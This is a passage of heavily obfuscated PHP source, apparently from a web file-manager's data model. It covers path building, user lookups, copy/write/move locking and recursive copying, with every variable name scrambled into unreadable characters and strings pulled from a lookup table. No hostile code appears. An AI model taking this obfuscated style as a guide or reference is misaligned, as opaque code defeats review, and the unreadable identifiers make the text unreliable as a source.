$≤Ê®´‚È[$°ØƒÍä£[90]][$°ØƒÍä£[193]]; } protected function _listAppendPath(&$áÙ˜ëﬂ¢, $í—ßﬂˆ∑ = false) { $ïöºè€œ =& $_SERVER[ß⁄ˆÇ†Œ]; static $¢◊„£≥Ñ = array(); $Í√Î’…ÿ = array(); $ë¶˙◊•∏ = array(); if ($í—ßﬂˆ∑) { return $¢◊„£≥Ñ; } foreach ($áÙ˜ëﬂ¢ as &$ÔŸÑ¸ÖÖ) { $ﬁË¸¢± = $ÔŸÑ¸ÖÖ[$ïöºè€œ[193]]; if ($ÔŸÑ¸ÖÖ[$ïöºè€œ[493]] == $ïöºè€œ[91] && $ÔŸÑ¸ÖÖ[$ïöºè€œ[192]] != 0) { $¢◊„£≥Ñ[$ﬁË¸¢±] = $ÔŸÑ¸ÖÖ[$ïöºè€œ[32]]; } if ($ÔŸÑ¸ÖÖ[$ïöºè€œ[493]] == $ïöºè€œ[91] && $ÔŸÑ¸ÖÖ[$ïöºè€œ[192]] == 0) { $¢◊„£≥Ñ[$ﬁË¸¢±] = $this->_listAppendPathRoot($ÔŸÑ¸ÖÖ, array()); } if (isset($ë¶˙◊•∏[$ÔŸÑ¸ÖÖ[$ïöºè€œ[592]]])) { continue; } $ë¶˙◊•∏[$ÔŸÑ¸ÖÖ[$ïöºè€œ[592]]] = !0; $∫ª˜âÚﬁ = $this->parentLevelArray($ÔŸÑ¸ÖÖ[$ïöºè€œ[592]]); foreach ($∫ª˜âÚﬁ as $∑⁄†êÆü => $´û—÷Ä¥) { if (isset($¢◊„£≥Ñ[$´û—÷Ä¥])) { continue; } if ($∑⁄†êÆü == 0) { $¢◊„£≥Ñ[$´û—÷Ä¥] = $this->_listAppendPathRoot($ÔŸÑ¸ÖÖ, $∫ª˜âÚﬁ); } if ($∑⁄†êÆü != 0) { $Í√Î’…ÿ[] = $´û—÷Ä¥; } } } unset($ÔŸÑ¸ÖÖ); $Í√Î’…ÿ = array_unique($Í√Î’…ÿ); if (count($Í√Î’…ÿ) > 0) { $åÂ“∏∆˜ = array($ïöºè€œ[499] => array($ïöºè€œ[500], $Í√Î’…ÿ)); if (count($Í√Î’…ÿ) == 1) { $ÌÇ∫ÒÙÖ = $this->sourceInfo($Í√Î’…ÿ[0]); $—›≤ÙÁ± = is_array($ÌÇ∫ÒÙÖ) ? array($ÌÇ∫ÒÙÖ) : !1; } else { $—›≤ÙÁ± = $this->field($ïöºè€œ[599])->where($åÂ“∏∆˜)->select(); } if (!$—›≤ÙÁ±) { $—›≤ÙÁ± = array(); } foreach ($—›≤ÙÁ± as $ÚÄ€õ√π) { $¢◊„£≥Ñ[$ÚÄ€õ√π[$ïöºè€œ[193]]] = $ÚÄ€õ√π[$ïöºè€œ[32]]; } } $Ôõä¢‡î = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÚäÔÿÍ˚ = array(); foreach ($áÙ˜ëﬂ¢ as &$ÔŸÑ¸ÖÖ) { $ØÇ≥™ü‡ = $ÔŸÑ¸ÖÖ[$ïöºè€œ[592]]; $ÜóøπÍï = $ïöºè€œ[12]; if (isset($ÚäÔÿÍ˚[$ØÇ≥™ü‡])) { $ÜóøπÍï = $ÚäÔÿÍ˚[$ØÇ≥™ü‡]; } else { $∫ª˜âÚﬁ = $this->parentLevelArray($ÔŸÑ¸ÖÖ[$ïöºè€œ[592]]); foreach ($∫ª˜âÚﬁ as $∑⁄†êÆü => $´û—÷Ä¥) { if (isset($¢◊„£≥Ñ[$´û—÷Ä¥])) { $ÜóøπÍï .= $¢◊„£≥Ñ[$´û—÷Ä¥] . $ïöºè€œ[8]; } } $ÚäÔÿÍ˚[$ØÇ≥™ü‡] = $ÜóøπÍï; } $ÜóøπÍï .= $ÔŸÑ¸ÖÖ[$ïöºè€œ[32]]; if ($ÔŸÑ¸ÖÖ[$ïöºè€œ[493]] == $ïöºè€œ[91]) { $ÜóøπÍï .= $ïöºè€œ[8]; } $ÔŸÑ¸ÖÖ[$ïöºè€œ[590]] = str_replace($ïöºè€œ[600], $ïöºè€œ[8], $ÜóøπÍï); if ($ÔŸÑ¸ÖÖ[$ïöºè€œ[192]] == $ïöºè€œ[228]) { $ÔŸÑ¸ÖÖ[$ïöºè€œ[32]] = trim($¢◊„£≥Ñ[$ÔŸÑ¸ÖÖ[$ïöºè€œ[193]]], $ïöºè€œ[8]); $ÔŸÑ¸ÖÖ[$ïöºè€œ[590]] = $ÔŸÑ¸ÖÖ[$ïöºè€œ[32]] . $ïöºè€œ[8]; } if (intval($ÔŸÑ¸ÖÖ[$ïöºè€œ[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ÔŸÑ¸ÖÖ, $∫ª˜âÚﬁ, $Ôõä¢‡î); } } unset($ÔŸÑ¸ÖÖ); return $áÙ˜ëﬂ¢; } private function _listAppendPathRecycle(&$¬œ∫øÜî, $∑≤∫â¬ë, $≈§’î§÷) { $ÄÆçÈ⁄Í =& $_SERVER[ß⁄ˆÇ†Œ]; if (!in_array($≈§’î§÷, $∑≤∫â¬ë) && $¬œ∫øÜî[$ÄÆçÈ⁄Í[193]] != $≈§’î§÷) { return; } $’∏«∏¶Á = explode($ÄÆçÈ⁄Í[8], trim($¬œ∫øÜî[$ÄÆçÈ⁄Í[590]], $ÄÆçÈ⁄Í[8])); $©ËÔ◊õÜ = implode($ÄÆçÈ⁄Í[8], array_slice($’∏«∏¶Á, 2)); $¬œ∫øÜî[$ÄÆçÈ⁄Í[590]] = $ÄÆçÈ⁄Í[8] . LNG($ÄÆçÈ⁄Í[601]) . $ÄÆçÈ⁄Í[8] . ltrim($©ËÔ◊õÜ, $ÄÆçÈ⁄Í[8]); $¬œ∫øÜî[$ÄÆçÈ⁄Í[592]] = $ÄÆçÈ⁄Í[602] . implode($ÄÆçÈ⁄Í[50], array_slice($∑≤∫â¬ë, 1)) . $ÄÆçÈ⁄Í[50]; if ($¬œ∫øÜî[$ÄÆçÈ⁄Í[193]] == $≈§’î§÷) { $¬œ∫øÜî[$ÄÆçÈ⁄Í[592]] = $ÄÆçÈ⁄Í[602]; $¬œ∫øÜî[$ÄÆçÈ⁄Í[192]] = $ÄÆçÈ⁄Í[228]; $¬œ∫øÜî[$ÄÆçÈ⁄Í[32]] = LNG($ÄÆçÈ⁄Í[601]); } $¬œ∫øÜî[$ÄÆçÈ⁄Í[603]] = $ÄÆçÈ⁄Í[604]; } protected function _listAppendPathRoot(&$ºï¿›∞É, $àŒÀ®Ö°) { $Œ◊ÇÔà€ =& $_SERVER[ß⁄ˆÇ†Œ]; static $Ôüéöé˚ = false; $èßúòä∏ = $Œ◊ÇÔà€[12]; if ($ºï¿›∞É[$Œ◊ÇÔà€[190]] == self::TYPE_USER) { if ($ºï¿›∞É[$Œ◊ÇÔà€[577]] == USER_ID) { $èßúòä∏ = LNG($Œ◊ÇÔà€[605]); if ($Ôüéöé˚ === !1) { $êÿ «¿È = Model($Œ◊ÇÔà€[606])->getInfoFull(USER_ID); $Ôüéöé˚ = _get($êÿ «¿È, $Œ◊ÇÔà€[607], $Œ◊ÇÔà€[12]); } if ($àŒÀ®Ö° && $àŒÀ®Ö°[0] == $Ôüéöé˚ || !$àŒÀ®Ö° && $ºï¿›∞É[$Œ◊ÇÔà€[193]] == $Ôüéöé˚) { $èßúòä∏ = LNG($Œ◊ÇÔà€[608]); $ºï¿›∞É[$Œ◊ÇÔà€[609]] = $Œ◊ÇÔà€[610]; } if (!$àŒÀ®Ö°) { $ºï¿›∞É[$Œ◊ÇÔà€[32]] = $èßúòä∏; } } else { $ºï¿›∞É[$Œ◊ÇÔà€[611]] = Model($Œ◊ÇÔà€[585])->getInfoSimpleOuter($ºï¿›∞É[$Œ◊ÇÔà€[577]]); $èßúòä∏ = LNG($Œ◊ÇÔà€[612]) . $Œ◊ÇÔà€[176] . $ºï¿›∞É[$Œ◊ÇÔà€[611]][$Œ◊ÇÔà€[32]] . $Œ◊ÇÔà€[178]; } } else { if ($ºï¿›∞É[$Œ◊ÇÔà€[190]] == self::TYPE_GROUP) { $ÔËªËΩ» = Model($Œ◊ÇÔà€[593])->getInfoSimple($ºï¿›∞É[$Œ◊ÇÔà€[577]]); $èßúòä∏ = $ÔËªËΩ»[$Œ◊ÇÔà€[32]]; } else { if ($ºï¿›∞É[$Œ◊ÇÔà€[190]] == self::TYPE_SYSTEM) { $èßúòä∏ = $Œ◊ÇÔà€[613]; } } } $èßúòä∏ = $èßúòä∏ ? $Œ◊ÇÔà€[8] . $èßúòä∏ . $Œ◊ÇÔà€[8] : $Œ◊ÇÔà€[8]; return $èßúòä∏; } protected function _listAppendUser(&$ƒ†°¥¯•) { $π¥¸Áº˝ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ò‚†æ¢’ = array_to_keyvalue($ƒ†°¥¯•, $π¥¸Áº˝[12], $π¥¸Áº˝[535]); $ “‡πÑ« = array_to_keyvalue($ƒ†°¥¯•, $π¥¸Áº˝[12], $π¥¸Áº˝[537]); $§ùä¿∑Õ = array_merge($Ò‚†æ¢’, $ “‡πÑ«); $•‚òµ˘• = Model($π¥¸Áº˝[606])->userListInfo($§ùä¿∑Õ); foreach ($ƒ†°¥¯• as &$·˙Å≤“˝) { $äÃãôÔ = $·˙Å≤“˝[$π¥¸Áº˝[535]]; $·˙Å≤“˝[$π¥¸Áº˝[535]] = $•‚òµ˘•[$äÃãôÔ] ? $•‚òµ˘•[$äÃãôÔ] : !1; $äÃãôÔ = $·˙Å≤“˝[$π¥¸Áº˝[537]]; $·˙Å≤“˝[$π¥¸Áº˝[537]] = $•‚òµ˘•[$äÃãôÔ] ? $•‚òµ˘•[$äÃãôÔ] : !1; if (_get($·˙Å≤“˝, $π¥¸Áº˝[614], 0)) { $Ã‘Úá”⁄ = $GLOBALS[$π¥¸Áº˝[6]][$π¥¸Áº˝[92]][$π¥¸Áº˝[615]]; if ($·˙Å≤“˝[$π¥¸Áº˝[547]][$π¥¸Áº˝[616]] <= time() - $Ã‘Úá”⁄) { $this->metaSet($·˙Å≤“˝[$π¥¸Áº˝[193]], $π¥¸Áº˝[617], null); $this->metaSet($·˙Å≤“˝[$π¥¸Áº˝[193]], $π¥¸Áº˝[616], null); unset($·˙Å≤“˝[$π¥¸Áº˝[547]][$π¥¸Áº˝[617]]); continue; } $◊è§·É† = $·˙Å≤“˝[$π¥¸Áº˝[547]][$π¥¸Áº˝[617]]; $·˙Å≤“˝[$π¥¸Áº˝[547]][$π¥¸Áº˝[618]] = Model($π¥¸Áº˝[606])->getInfoSimpleOuter($◊è§·É†); } } unset($·˙Å≤“˝); } public function parentLevelArray($é˘ÿö˜ﬂ) { $†≤åÑÒÎ =& $_SERVER[ß⁄ˆÇ†Œ]; $é˘ÿö˜ﬂ = explode($†≤åÑÒÎ[50], trim($é˘ÿö˜ﬂ, $†≤åÑÒÎ[50])); return array_remove_value($é˘ÿö˜ﬂ, $†≤åÑÒÎ[228]); } public function listAll($¯ÓÜÄ∫¶) { $‚ÛûÑ◊õ =& $_SERVER[ß⁄ˆÇ†Œ]; $√¨è£≤Ò = $this->sourceInfo($¯ÓÜÄ∫¶); $Êîìˆ˘˜ = array($‚ÛûÑ◊õ[619] => array($‚ÛûÑ◊õ[620], $√¨è£≤Ò[$‚ÛûÑ◊õ[592]] . $¯ÓÜÄ∫¶ . $‚ÛûÑ◊õ[621]), $‚ÛûÑ◊õ[622] => 0); $ò¶ ÃÙÓ = $‚ÛûÑ◊õ[623]; $—ºó˘úÕ = "\x4c\x45\106\124\40\112\x4f\x49\116\40{$this->tablePrefix}\x69\157\x5f\146\151\x6c\145\40\146\x69\154\x65\40\157\156\x20\x73\x6f\165\x72\143\145\x2e\x66\151\x6c\145\x49\x44\x20\x3d\x20\x66\151\154\145\x2e\x66\151\154\145\x49\104"; $Ô≠¬œî‘ = $this->alias($‚ÛûÑ◊õ[527])->field($ò¶ ÃÙÓ)->where($Êîìˆ˘˜)->join($—ºó˘úÕ)->select(); $this->_listAppendAuth($Ô≠¬œî‘); $this->_listAppendUser($Ô≠¬œî‘); $this->_listAppendPath($Ô≠¬œî‘); $Ô≠¬œî‘ = array_to_keyvalue($Ô≠¬œî‘, $‚ÛûÑ◊õ[193]); $Øî∂Ò◊À = "\57{$√¨è£≤Ò[$‚ÛûÑ◊õ[32]]}\x2f"; $Øî∂Ò◊À = $Øî∂Ò◊À == $‚ÛûÑ◊õ[600] ? $‚ÛûÑ◊õ[8] : $Øî∂Ò◊À; $∫£‘ëª‘ = array(); foreach ($Ô≠¬œî‘ as $∫Ïõ‚å· => $Ë‹õÔ⁄´) { $⁄¬©ïæò = $this->parentLevelArray($Ë‹õÔ⁄´[$‚ÛûÑ◊õ[592]]); array_shift($⁄¬©ïæò); $œæ∂¶ß∞ = $Øî∂Ò◊À; for ($ÚºË÷û¸ = 0; $ÚºË÷û¸ < count($⁄¬©ïæò); $ÚºË÷û¸++) { $œæ∂¶ß∞ .= $Ô≠¬œî‘[$⁄¬©ïæò[$ÚºË÷û¸]][$‚ÛûÑ◊õ[32]] . $‚ÛûÑ◊õ[8]; } $œæ∂¶ß∞ .= $Ë‹õÔ⁄´[$‚ÛûÑ◊õ[32]]; if ($Ë‹õÔ⁄´[$‚ÛûÑ◊õ[493]]) { $œæ∂¶ß∞ .= $‚ÛûÑ◊õ[8]; } $¨™Ä¶’∏ = array($‚ÛûÑ◊õ[503] => str_replace($‚ÛûÑ◊õ[600], $‚ÛûÑ◊õ[8], str_replace($‚ÛûÑ◊õ[600], $‚ÛûÑ◊õ[8], str_replace($‚ÛûÑ◊õ[600], $‚ÛûÑ◊õ[8], $œæ∂¶ß∞))), $‚ÛûÑ◊õ[624] => intval($Ë‹õÔ⁄´[$‚ÛûÑ◊õ[493]]), $‚ÛûÑ◊õ[625] => intval($Ë‹õÔ⁄´[$‚ÛûÑ◊õ[79]]), $‚ÛûÑ◊õ[88] => intval($Ë‹õÔ⁄´[$‚ÛûÑ◊õ[88]]), $‚ÛûÑ◊õ[90] => $this->pathInfoFilter($Ë‹õÔ⁄´)); if (!$¨™Ä¶’∏[$‚ÛûÑ◊õ[493]]) { $¨™Ä¶’∏[$‚ÛûÑ◊õ[549]] = $Ë‹õÔ⁄´[$‚ÛûÑ◊õ[549]]; } $∫£‘ëª‘[] = $¨™Ä¶’∏; } $∫£‘ëª‘ = array_sort_by($∫£‘ëª‘, $‚ÛûÑ◊õ[87]); return $∫£‘ëª‘; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($∏ﬂôÓ∂) { $ä‰ﬂÂ≠¡ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ä‰ﬂÂ≠¡[626], $∏ﬂôÓ∂); $≈‘¨áÃ– = 1; $this->_lockEvent($∏ﬂôÓ∂, array($ä‰ﬂÂ≠¡[627], $ä‰ﬂÂ≠¡[628]), $≈‘¨áÃ–); $this->_lockParent($∏ﬂôÓ∂, array($ä‰ﬂÂ≠¡[628]), $≈‘¨áÃ–); $this->_lockEvent($∏ﬂôÓ∂, array($ä‰ﬂÂ≠¡[629], $ä‰ﬂÂ≠¡[630]), $≈‘¨áÃ–); $this->_lockCheckEnd($ä‰ﬂÂ≠¡[626], $∏ﬂôÓ∂); } public function lockCopyEnd($Ñê –◊) { $≠Ï“⁄ìŸ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->allowLock()) { return; } $Õ’¥·Ö˜ = 0; $this->_lockEvent($Ñê –◊, array($≠Ï“⁄ìŸ[627], $≠Ï“⁄ìŸ[628]), $Õ’¥·Ö˜); $this->_lockParent($Ñê –◊, array($≠Ï“⁄ìŸ[628]), $Õ’¥·Ö˜); $this->_lockEvent($Ñê –◊, array($≠Ï“⁄ìŸ[629], $≠Ï“⁄ìŸ[630]), $Õ’¥·Ö˜); } public function lockWriteStart($éı–®∆æ, $∂©«â‘Û = '') { $«„ÀÈÕ≠ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->allowLock()) { return; } $this->_lockCheck($«„ÀÈÕ≠[627], $éı–®∆æ); $ı⁄–∫öâ = 1; $this->_lockKey($«„ÀÈÕ≠[631] . $éı–®∆æ . $«„ÀÈÕ≠[10] . $∂©«â‘Û, $ı⁄–∫öâ); $this->_lockEvent($éı–®∆æ, array($«„ÀÈÕ≠[626], $«„ÀÈÕ≠[628]), $ı⁄–∫öâ); $this->_lockParent($éı–®∆æ, array($«„ÀÈÕ≠[626], $«„ÀÈÕ≠[628]), $ı⁄–∫öâ); $this->_lockCheckEnd($«„ÀÈÕ≠[627], $éı–®∆æ); } public function lockWriteEnd($îœ≥ï˝ƒ, $ŸÛÛ¶Ï¸ = '') { $±∏øª˚ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->allowLock()) { return; } $∆∏ñ©¬ò = 0; $this->_lockKey($±∏øª˚[631] . $îœ≥ï˝ƒ . $±∏øª˚[10] . $ŸÛÛ¶Ï¸, $∆∏ñ©¬ò); $this->_lockEvent($îœ≥ï˝ƒ, array($±∏øª˚[626], $±∏øª˚[628]), $∆∏ñ©¬ò); $this->_lockParent($îœ≥ï˝ƒ, array($±∏øª˚[626], $±∏øª˚[628]), $∆∏ñ©¬ò); } public function lockMoveStart($ä◊ø˛Ú ) { $æïœ°¥≤ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->allowLock()) { return; } $this->_lockCheck($æïœ°¥≤[628], $ä◊ø˛Ú ); $˝Ì‰˚ˆ¿ = 1; $this->_lockKey($æïœ°¥≤[632] . $ä◊ø˛Ú , $˝Ì‰˚ˆ¿); $this->_lockEvent($ä◊ø˛Ú , array($æïœ°¥≤[626], $æïœ°¥≤[627]), $˝Ì‰˚ˆ¿); $this->_lockParent($ä◊ø˛Ú , array($æïœ°¥≤[626], $æïœ°¥≤[628]), $˝Ì‰˚ˆ¿); $this->_lockEvent($ä◊ø˛Ú , array($æïœ°¥≤[633], $æïœ°¥≤[629], $æïœ°¥≤[630]), $˝Ì‰˚ˆ¿); $this->_lockCheckEnd($æïœ°¥≤[628], $ä◊ø˛Ú ); } public function lockMoveEnd($Ã±∂í–£) { $√€ÄñÎÜ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->allowLock()) { return; } $Õûîˆ≥Ç = 0; $this->_lockKey($√€ÄñÎÜ[632] . $Ã±∂í–£, $Õûîˆ≥Ç); $this->_lockEvent($Ã±∂í–£, array($√€ÄñÎÜ[626], $√€ÄñÎÜ[627]), $Õûîˆ≥Ç); $this->_lockParent($Ã±∂í–£, array($√€ÄñÎÜ[626], $√€ÄñÎÜ[628]), $Õûîˆ≥Ç); $this->_lockEvent($Ã±∂í–£, array($√€ÄñÎÜ[633], $√€ÄñÎÜ[629], $√€ÄñÎÜ[630]), $Õûîˆ≥Ç); } private function _lockCheck($àÈÔòñ¸, $µë–îË£) { $„˙ ÊÙø =& $_SERVER[ß⁄ˆÇ†Œ]; $ª≤ù…˛ = $this->sourceInfo($µë–îË£); $÷˜ﬁı¥Û = $àÈÔòñ¸ . $„˙ ÊÙø[10] . $µë–îË£; $this->_lockTimeStart[$÷˜ﬁı¥Û] = timeFloat(); if (!is_array($ª≤ù…˛)) { return; } $≥ö‹˜´÷ = LNG($„˙ ÊÙø[634]); CacheLock::setErrorMsg($„˙ ÊÙø[176] . htmlspecialchars($ª≤ù…˛[$„˙ ÊÙø[32]]) . $„˙ ÊÙø[178] . $≥ö‹˜´÷); $this->_lockKey($÷˜ﬁı¥Û, 1); $this->_lockKey($÷˜ﬁı¥Û, 0); $˙¿°äÅ∑ = array_reverse($this->parentLevelArray($ª≤ù…˛[$„˙ ÊÙø[592]])); foreach ($˙¿°äÅ∑ as $◊ﬁ∞ö®Ü) { $÷˜ﬁı¥Û = $àÈÔòñ¸ . $„˙ ÊÙø[635] . $◊ﬁ∞ö®Ü; if (CacheLock::lockGet($„˙ ÊÙø[636] . $÷˜ﬁı¥Û)) { $ª≤ù…˛ = $this->sourceInfo($◊ﬁ∞ö®Ü); CacheLock::setErrorMsg($„˙ ÊÙø[176] . htmlspecialchars($ª≤ù…˛[$„˙ ÊÙø[32]]) . $„˙ ÊÙø[178] . $≥ö‹˜´÷); $this->_lockKey($÷˜ﬁı¥Û, 1); $this->_lockKey($÷˜ﬁı¥Û, 0); } } } private function _lockCheckEnd($‰´ç≤˝ƒ, $ÿé»Ã√∂) { $≤îâÒ‰∑ =& $_SERVER[ß⁄ˆÇ†Œ]; $∫ÂüΩ¨Å = $‰´ç≤˝ƒ . $≤îâÒ‰∑[10] . $ÿé»Ã√∂; CacheLock::setErrorMsg($≤îâÒ‰∑[329]); if (!isset($this->_lockTimeStart[$∫ÂüΩ¨Å])) { return; } $£äÎπ√œ = timeFloat() - $this->_lockTimeStart[$∫ÂüΩ¨Å]; unset($this->_lockTimeStart[$∫ÂüΩ¨Å]); if ($£äÎπ√œ > 0.5) { unset(self::$cacheSourceInfo[$≤îâÒ‰∑[541] . $ÿé»Ã√∂]); } $Ω“êí™» = $this->sourceInfo($ÿé»Ã√∂); if (!$Ω“êí™») { show_json(LNG($≤îâÒ‰∑[108]), !1); } } private function _lockParent($´≠ãæ⁄Æ, $Ú·ﬂìﬂî, $⁄‘Ü …Å) { if (!$this->autoLockSet) { return; } $à¨ç ø÷ = $this->sourceInfo($´≠ãæ⁄Æ); if (!is_array($à¨ç ø÷)) { return; } $Œô±ÉÄ• = array_reverse($this->parentLevelArray($à¨ç ø÷[$_SERVER[ß⁄ˆÇ†Œ][592]])); foreach ($Œô±ÉÄ• as $Û ÉÓÆÍ) { $this->_lockEvent($Û ÉÓÆÍ, $Ú·ﬂìﬂî, $⁄‘Ü …Å); } } private function _lockEvent($¥Áñäƒ©, $∏ËèÍÍ¥, $‡˝¶†ÀÜ) { $÷ï ı—ã =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->autoLockSet) { return; } foreach ($∏ËèÍÍ¥ as $≤òÃ⁄∆®) { $÷∫◊Á√Ç = $≤òÃ⁄∆® . $÷ï ı—ã[10] . $¥Áñäƒ©; if ($‡˝¶†ÀÜ && CacheLock::lockGet($÷ï ı—ã[636] . $÷∫◊Á√Ç)) { continue; } $this->_lockKey($÷∫◊Á√Ç, $‡˝¶†ÀÜ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($¬ÆŒ˛®ó, $∆¡è‚ßû = 1) { $®Ç€©¡ˆ = $_SERVER[ß⁄ˆÇ†Œ][636] . md5($¬ÆŒ˛®ó); if ($∆¡è‚ßû) { if (isset(self::$_lockItemArr[$®Ç€©¡ˆ])) { return; } self::$_lockItemArr[$®Ç€©¡ˆ] = 1; CacheLock::lock($®Ç€©¡ˆ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$®Ç€©¡ˆ])) { return; } unset(self::$_lockItemArr[$®Ç€©¡ˆ]); CacheLock::unlock($®Ç€©¡ˆ); } } public function isParentOf($Ò≤í¨—‡, $‘˝ÄÒÊÃ) { $Ôû€‰Á≥ =& $_SERVER[ß⁄ˆÇ†Œ]; $…÷¿˚√í = $this->sourceInfo($Ò≤í¨—‡); $™ Ÿ˘∑è = $this->sourceInfo($‘˝ÄÒÊÃ); $‹öÇ—äÆ = $…÷¿˚√í[$Ôû€‰Á≥[592]] . $…÷¿˚√í[$Ôû€‰Á≥[193]] . $Ôû€‰Á≥[50]; $í≠¬«îë = $™ Ÿ˘∑è[$Ôû€‰Á≥[592]] . $™ Ÿ˘∑è[$Ôû€‰Á≥[193]] . $Ôû€‰Á≥[50]; $„¯Â†≈Ÿ = strpos($í≠¬«îë, $‹öÇ—äÆ) === 0; return $„¯Â†≈Ÿ; } private $targetIsDelete = 0; public function copy($Œ˚∞«Ù”, $ô∑Ö¡∏Í, $å ¯ƒÜÈ = REPEAT_REPLACE, $Åø∑“Ê´ = '') { $˚åüúﬁ¬ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÜËÏÕ…˝ = $this->sourceInfo($Œ˚∞«Ù”); $”§ÒÖÈ— = $this->sourceInfo($ô∑Ö¡∏Í); if (!$ÜËÏÕ…˝ || !$”§ÒÖÈ— || $”§ÒÖÈ—[$˚åüúﬁ¬[493]] != $˚åüúﬁ¬[91]) { return !1; } if ($this->isParentOf($Œ˚∞«Ù”, $ô∑Ö¡∏Í)) { return !1; } $¡ÄŸ˝ö≥ = $Åø∑“Ê´ ? $Åø∑“Ê´ : $ÜËÏÕ…˝[$˚åüúﬁ¬[32]]; $this->lockCopyStart($Œ˚∞«Ù”); $this->lockWriteStart($ô∑Ö¡∏Í, $¡ÄŸ˝ö≥); $∏ÅπÚÙ˘ = array($˚åüúﬁ¬[637] => array(), $˚åüúﬁ¬[638] => array(), $˚åüúﬁ¬[639] => array()); $this->targetIsDelete = intval($ÜËÏÕ…˝[$˚åüúﬁ¬[513]]); $“”Ωã¨ = $this->fileNameExistAuto($ô∑Ö¡∏Í, $ÜËÏÕ…˝); $Ã®™É¶Ü = $this->_copy($Œ˚∞«Ù”, $ô∑Ö¡∏Í, $å ¯ƒÜÈ, $∏ÅπÚÙ˘, !0, $Åø∑“Ê´); $this->_childrenListClear(); $this->lockCopyEnd($Œ˚∞«Ù”); $this->lockWriteEnd($ô∑Ö¡∏Í, $¡ÄŸ˝ö≥); if ($ÜËÏÕ…˝[$˚åüúﬁ¬[493]] == $˚åüúﬁ¬[91] && $“”Ωã¨ == $Ã®™É¶Ü) { $this->folderSizeResetChildren($“”Ωã¨); } Model($˚åüúﬁ¬[640])->addAll($∏ÅπÚÙ˘[$˚åüúﬁ¬[638]], array(), !0); if ($“”Ωã¨ != $Ã®™É¶Ü || $ÜËÏÕ…˝[$˚åüúﬁ¬[493]] == $˚åüúﬁ¬[91]) { Model($˚åüúﬁ¬[641])->eventCopy($Ã®™É¶Ü); } $this->saveAll($∏ÅπÚÙ˘[$˚åüúﬁ¬[639]]); Model($˚åüúﬁ¬[230])->linkAdd($∏ÅπÚÙ˘[$˚åüúﬁ¬[637]]); $this->folderSizeReset($ô∑Ö¡∏Í); $this->updateModifyTime($ô∑Ö¡∏Í); return $Ã®™É¶Ü; } private function _copy($¡ª«ÑÛÇ, $ƒÄ∏È¿ç, $ƒ‹€•⁄ù, &$£Ï…Êﬁ£, $Ù¢Òëò£, $◊˝™˜¡µ = '') { $Ç°Ã…Ñˆ =& $_SERVER[ß⁄ˆÇ†Œ]; $ãﬂâ‚—ä = $this->sourceInfoCache($¡ª«ÑÛÇ); $∞íÇ´õË = $ãﬂâ‚—ä[$Ç°Ã…Ñˆ[493]] == $Ç°Ã…Ñˆ[91]; $ñíà‚œÉ = $◊˝™˜¡µ ? $◊˝™˜¡µ : $ãﬂâ‚—ä[$Ç°Ã…Ñˆ[32]]; $”∫ª±”Ë = $this->fileNameExistAuto($ƒÄ∏È¿ç, $ãﬂâ‚—ä); if ($Ù¢Òëò£) { $this->_childrenAllMake($¡ª«ÑÛÇ); if ($∞íÇ´õË && $”∫ª±”Ë) { $this->_childrenAllMake($”∫ª±”Ë); } } if (!$”∫ª±”Ë) { return $this->_copyCreate($¡ª«ÑÛÇ, $ƒÄ∏È¿ç, $ñíà‚œÉ, $£Ï…Êﬁ£); } $©®∞äÎ… = $”∫ª±”Ë; if ($∞íÇ´õË) { if ($ƒ‹€•⁄ù == REPEAT_RENAME_FOLDER) { $ñíà‚œÉ = $this->fileNameAutoCache($ƒÄ∏È¿ç, $ñíà‚œÉ, $ƒ‹€•⁄ù, $∞íÇ´õË); $©®∞äÎ… = $this->_copyCreate($¡ª«ÑÛÇ, $ƒÄ∏È¿ç, $ñíà‚œÉ, $£Ï…Êﬁ£); } else { $•¸ˆÀ¥ó = $this->_childrenList($¡ª«ÑÛÇ); foreach ($•¸ˆÀ¥ó as $‡°¬©…˛) { $this->_copy($‡°¬©…˛[$Ç°Ã…Ñˆ[193]], $”∫ª±”Ë, $ƒ‹€•⁄ù, $£Ï…Êﬁ£, !1); } } } else { if ($ƒ‹€•⁄ù == REPEAT_RENAME || $ƒ‹€•⁄ù == REPEAT_RENAME_FOLDER) { $ñíà‚œÉ = $this->fileNameAutoCache($ƒÄ∏È¿ç, $ñíà‚œÉ, $ƒ‹€•⁄ù, $∞íÇ´õË); $©®∞äÎ… = $this->_copyCreate($¡ª«ÑÛÇ, $ƒÄ∏È¿ç, $ñíà‚œÉ, $£Ï…Êﬁ£); } else { if ($ƒ‹€•⁄ù == REPEAT_REPLACE) { $€àﬂô¿Ÿ = $this->sourceInfoCache($”∫ª±”Ë); $èø¥•Îé = $this->fileHistory($€àﬂô¿Ÿ, $ãﬂâ‚—ä[$Ç°Ã…Ñˆ[549]], $ãﬂâ‚—ä[$Ç°Ã…Ñˆ[79]]); if ($èø¥•Îé) { $£Ï…Êﬁ£[$Ç°Ã…Ñˆ[637]][] = $ãﬂâ‚—ä[$Ç°Ã…Ñˆ[549]]; } } else { if ($ƒ‹€•⁄ù == REPEAT_SKIP) { } } } Hook::trigger($Ç°Ã…Ñˆ[642], array($Ç°Ã…Ñˆ[643], $ãﬂâ‚—ä, 0)); } return $©®∞äÎ…; } private function _copyCreate($È⁄Ë—ªÓ, $ëßÚ¥Åˆ, $ñ·“œÑÖ, &$Ù∑±‰ª¥) { $ü‘≥Ω‹¡ =& $_SERVER[ß⁄ˆÇ†Œ]; $⁄Ω”ê†ë = $this->sourceInfoCache($È⁄Ë—ªÓ); $Ÿ—£∞…å = $this->sourceInfoCache($ëßÚ¥Åˆ); $Õ¥µøí = $this->_makeItemData($⁄Ω”ê†ë, $Ÿ—£∞…å, $ñ·“œÑÖ); 